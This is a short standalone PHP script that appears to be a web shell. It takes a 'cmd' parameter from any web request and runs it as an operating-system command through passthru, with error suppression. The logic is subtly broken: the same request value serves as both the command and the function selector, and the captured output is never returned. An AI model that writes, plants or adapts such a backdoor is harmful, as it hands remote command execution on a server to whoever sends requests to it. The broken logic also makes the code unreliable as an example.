<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "passthru": @ob_start();	@passthru($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
	}
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>